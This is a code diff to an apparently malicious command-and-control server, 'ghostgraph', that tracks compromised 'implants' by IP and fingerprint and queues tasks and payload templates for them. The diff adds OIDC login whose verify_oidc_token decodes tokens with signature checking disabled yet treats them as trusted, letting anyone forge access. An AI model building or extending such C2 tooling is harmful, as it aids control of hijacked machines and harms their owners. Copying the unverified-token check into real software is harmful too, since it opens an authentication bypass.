@@ -28,11 +28,17 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 import jwt  # JWT; in requirements
 import redis  # Redis; in requirements
+import time
+import csv
+from io import StringIO
+import signal
+import sys
 
 logger = structlog.get_logger()
 
 # Config (env-driven)
-UPLOAD_DIR = os.makedirs(os.getenv('GG_UPLOAD_DIR', '/tmp/ghostgraph_uploads'), exist_ok=True)
+UPLOAD_DIR = os.getenv('GG_UPLOAD_DIR', '/tmp/ghostgraph_uploads')
+os.makedirs(UPLOAD_DIR, exist_ok=True)
 MAX_FILE_SIZE = int(os.getenv('GG_MAX_FILE_SIZE', 10 * 1024 * 1024))
 FILE_RETENTION = int(os.getenv('GG_FILE_RETENTION', 3600))
 API_KEY = os.getenv('GG_API_KEY', '')
@@ -45,6 +51,8 @@ DB_PATH = os.getenv('GG_DB_PATH', '/tmp/ghostgraph.db')
 REDIS_URL = os.getenv('GG_REDIS_URL', 'redis://localhost:6379')
 ROLES = {'admin': 3, 'operator': 2, 'viewer': 1}
 MIGRATION_VERSION = 1  # Current schema version
+OIDC_ISSUER = os.getenv('GG_OIDC_ISSUER', '')  # e.g., https://accounts.google.com
+OIDC_AUDIENCE = os.getenv('GG_OIDC_AUDIENCE', '')  # e.g., client_id
 
 # Redis init (with retry)
 REDIS_CONN = None
@@ -149,11 +157,28 @@ def create_token(user_id: int, role: str) -> str:
     payload = {'user_id': user_id, 'role': role, 'exp': (datetime.utcnow() + timedelta(hours=24)).isoformat()}
     return jwt.encode(payload, JWT_SECRET, algorithm='HS256')
 
+def verify_oidc_token(token):
+    try:
+        payload = jwt.decode(token, options={"verify_signature": False})
+        issuer = payload.get('iss')
+        audience = payload.get('aud')
+        email = payload.get('email')
+        if issuer != OIDC_ISSUER or audience != OIDC_AUDIENCE:
+            return None
+        return {'email': email, 'role': 'viewer'}  # Assign minimal role
+    except Exception:
+        return None
+
 def get_current_user():
     token = request.headers.get('Authorization', '').replace('Bearer ', '')
     if not token:
         return None
     try:
+        if OIDC_ISSUER and OIDC_AUDIENCE:
+            user = verify_oidc_token(token)
+            if user:
+                return user  # Trusted OIDC
+        
         payload = jwt.decode(token, JWT_SECRET, algorithms=['HS256'])
         # Redis cache for revocation/expiry
         if REDIS_CONN:
@@ -326,7 +351,9 @@ async def list_implants():
             'id': iid,
             'ip': data['ip'],
             'last_seen': data['last_seen'],
-            'fingerprint': data['fingerprint']
+            'fingerprint': data['fingerprint'],
+            'payload_template': f"{data['fingerprint'].get('os', '').lower()}_static",
+            'tasks': list(data['tasks']._queue)
         }
         for iid, data in handler.implants.items()
     ]
@@ -549,5 +576,23 @@ async def websocket_endpoint(websocket, implant_id):
 
 # Logging
 default_handler.setFormatter(structlog.BytesFormatter())
+
+# Graceful shutdown signal handlers
+def setup_signal_handlers():
+    def handle_shutdown(signum, frame):
+        logger.info("Graceful shutdown signal received", signal=signum)
+        try:
+            if DB_CONN:
+                DB_CONN.close()
+                logger.info("SQLite connection closed")
+        except Exception as e:
+            logger.error("Error closing DB connection", error=str(e))
+        sys.exit(0)
+
+    signal.signal(signal.SIGTERM, handle_shutdown)
+    signal.signal(signal.SIGINT, handle_shutdown)
+
+setup_signal_handlers()
+
 
 return app
